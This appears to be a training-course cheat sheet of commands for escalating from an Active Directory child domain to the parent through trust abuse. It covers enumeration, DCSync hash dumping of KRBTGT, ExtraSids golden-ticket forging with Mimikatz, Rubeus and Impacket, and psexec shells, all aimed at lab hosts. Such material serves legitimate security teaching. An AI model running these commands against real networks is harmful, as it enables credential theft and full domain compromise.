# Trust Relationships Child Parent Trusts

***

| Command                                                                                                                                                                                                                         | Description                                                                                                                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| `Import-Module activedirectory`                                                                                                                                                                                                 | Used to import the `Active Directory` module. Performed from a Windows-based host.                                                               |
| `Get-ADTrust -Filter *`                                                                                                                                                                                                         | PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.                         |
| `Get-DomainTrust`                                                                                                                                                                                                               | PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.                             |
| `Get-DomainTrustMapping`                                                                                                                                                                                                        | PowerView tool used to perform a domain trust mapping from a Windows-based host.                                                                 |
| `Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \| select SamAccountName`                                                                                                                                                 | PowerView tools used to enumerate users in a target child domain from a Windows-based host.                                                      |
| `mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`                                                                                                                                                                             | Uses Mimikatz to obtain the `KRBTGT` account's `NT Hash` from a Windows-based host.                                                              |
| `Get-DomainSID`                                                                                                                                                                                                                 | PowerView tool used to get the SID for a target child domain from a Windows-based host.                                                          |
| `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" \| select distinguishedname,objectsid`                                                                                                               | PowerView tool used to obtain the `Enterprise Admins` group's SID from a Windows-based host.                                                     |
| `ls \\academy-ea-dc01.inlanefreight.local\c$`                                                                                                                                                                                   | Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host.                          |
| `mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt` | Uses `Mimikatz` to create a `Golden Ticket` from a Windows-based host .                                                                          |
| `.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt`            | Uses `Rubeus` to create a `Golden Ticket` from a Windows-based host.                                                                             |
| `mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm`                                                                                                                                                                        | Uses `Mimikatz` to perform a DCSync attack from a Windows-based host.                                                                            |
| `secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt`                                                                                                                      | Impacket tool used to perform a DCSync attack from a Linux-based host.                                                                           |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`                                                                                                                                                       | Impacket tool used to perform a `SID Brute forcing` attack from a Linux-based host.                                                              |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \| grep "Domain SID"`                                                                                                                                  | Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host.                                                       |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 \| grep -B12 "Enterprise Admins"`                                                                                                                        | Impacket tool used to retrieve the `SID` of a target Windows domain and attach it to the Enterprise Admin group's `RID` from a Linux-based host. |
| `ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker`                | Impacket tool used to create a `Golden Ticket` from a Linux-based host.                                                                          |
| `export KRB5CCNAME=hacker.ccache`                                                                                                                                                                                               | Used to set the `KRB5CCNAME Environment Variable` from a Linux-based host.                                                                       |
| `psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5`                                                                                                          | Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host.                                         |
| `raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`                                                                                                                                           | Impacket tool that automatically performs an attack that escalates from child to parent domain.                                                  |
